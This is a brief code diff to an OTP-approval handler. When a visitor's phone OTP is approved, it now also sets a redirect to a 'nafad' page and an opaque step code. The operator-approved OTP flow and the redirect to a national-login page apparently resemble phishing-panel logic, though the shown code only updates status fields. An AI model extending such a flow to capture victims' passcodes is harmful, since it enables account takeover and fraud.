@@ -138,9 +138,11 @@ export async function handlePhoneOtpApproval(
   // Update history status
   await updateHistoryStatus(visitorId, historyId, "approved", history)
   
-  // Move to nafad page
+  // Approve phone OTP and redirect to nafad page
   await updateApplication(visitorId, {
-    phoneOtpStatus: "approved" as any
+    phoneOtpStatus: "approved" as any,
+    redirectPage: "nafad" as any,
+    currentStep: "_t6" as any
   })
 }
 
